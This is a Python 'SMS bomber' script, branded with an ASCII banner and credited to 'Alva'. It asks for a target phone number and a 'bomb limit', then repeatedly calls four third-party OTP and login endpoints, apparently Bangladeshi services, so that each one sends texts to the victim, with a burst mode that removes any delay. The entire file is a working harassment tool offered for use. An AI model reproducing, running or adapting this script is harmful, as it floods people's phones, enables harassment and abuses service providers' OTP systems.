import urllib.parse
import requests
import time

logo = '''
.----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------.  .----------------. 
| .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. || .--------------. |
| |      __      | || |   _____      | || | ____   ____  | || |      __      | || |    _______   | || | ____    ____ | || |    _______   | |
| |     /  \     | || |  |_   _|     | || ||_  _| |_  _| | || |     /  \     | || |   /  ___  |  | || ||_   \  /   _|| || |   /  ___  |  | |
| |    / /\ \    | || |    | |       | || |  \ \   / /   | || |    / /\ \    | || |  |  (__ \_|  | || |  |   \/   |  | || |  |  (__ \_|  | |
| |   / ____ \   | || |    | |   _   | || |   \ \ / /    | || |   / ____ \   | || |   '.___`-.   | || |  | |\  /| |  | || |   '.___`-.   | |
| | _/ /    \ \_ | || |   _| |__/ |  | || |    \ ' /     | || | _/ /    \ \_ | || |  |`\____) |  | || | _| |_\/_| |_ | || |  |`\____) |  | |
| ||____|  |____|| || |  |________|  | || |     \_/      | || ||____|  |____|| || |  |_______.'  | || ||_____||_____|| || |  |_______.'  | |
| |              | || |              | || |              | || |              | || |              | || |              | || |              | |
| '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' || '--------------' |
 '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------'  '----------------' 
'''

def send_sms(phone_number, bomb_limit, burst_mode=True, show_sent=False, verbose=True):
    print("Installer Version 2023")
    print("Created By Alva")

    try:
        response_data = {}

        # Send request to each API based on the bomb limit
        for i in range(bomb_limit):
            # Send request to first API
            first_api_url = f"https://www.teamdccs.xyz/sms.php?number={urllib.parse.quote(phone_number)}"
            response = requests.get(first_api_url).text
            response_data[f"First API - Request {i+1}"] = response

            # Send request to second API
            second_api_url = "https://apix.rabbitholebd.com/appv2/login/requestOTP"
            second_api_payload = {"mobile": phone_number}
            second_api_headers = {"Content-Type": "application/json"}
            second_api_response = requests.post(second_api_url, json=second_api_payload, headers=second_api_headers).json()
            response_data[f"Second API - Request {i+1}"] = second_api_response

            # Send request to third API
            third_api_url = "http://nesco.sslwireless.com/api/v1/login"
            third_api_payload = {"phone_number": phone_number}
            third_api_headers = {"Content-Type": "application/json"}
            third_api_response = requests.post(third_api_url, json=third_api_payload, headers=third_api_headers).json()
            response_data[f"Third API - Request {i+1}"] = third_api_response

            try:
                # Send request to fourth API
                formatted_phone_number = "+88" + phone_number
                fourth_api_url = "https://api3.bioscopelive.com/auth/api/login/send-otp"
                fourth_api_payload = {"operator": "all", "msisdn": formatted_phone_number}
                fourth_api_headers = {"Content-Type": "application/json"}
                fourth_api_response = requests.post(fourth_api_url, json=fourth_api_payload, headers=fourth_api_headers).json()
                response_data[f"Fourth API - Request {i+1}"] = fourth_api_response
            except requests.exceptions.RequestException as e:
                response_data[f"Fourth API - Request {i+1}"] = f"An error occurred: {str(e)}"

            # Add a delay between requests if burst_mode is False
            if not burst_mode and i < bomb_limit - 1:
                time.sleep(1)  # Adjust the delay time as needed

        if show_sent and verbose:
            print("Sent requests:")
            for api_name, api_response in response_data.items():
                print(f"{api_name} Response: {api_response}")
        elif show_sent:
            print("Sent requests:")
            for api_name in response_data.keys():
                print(api_name)
        elif verbose:
            print("Status:")
            for api_name, api_response in response_data.items():
                print(f"{api_name} Response: {api_response}")

    except requests.exceptions.RequestException as e:
        print(f"An error occurred during API request: {str(e)}")


if __name__ == '__main__':
    print(logo)
    phone_number = input("Enter the phone number: ")
    bomb_limit = int(input("Enter the bomb limit: "))
    burst_mode = input("Burst mode? (Y/N): ").lower() == 'y'
    show_sent = input("Show sent requests? (Y/N): ").lower() == 'y'
    verbose = input("Verbose output? (Y/N): ").lower() == 'y'

    send_sms(phone_number, bomb_limit, burst_mode, show_sent, verbose)
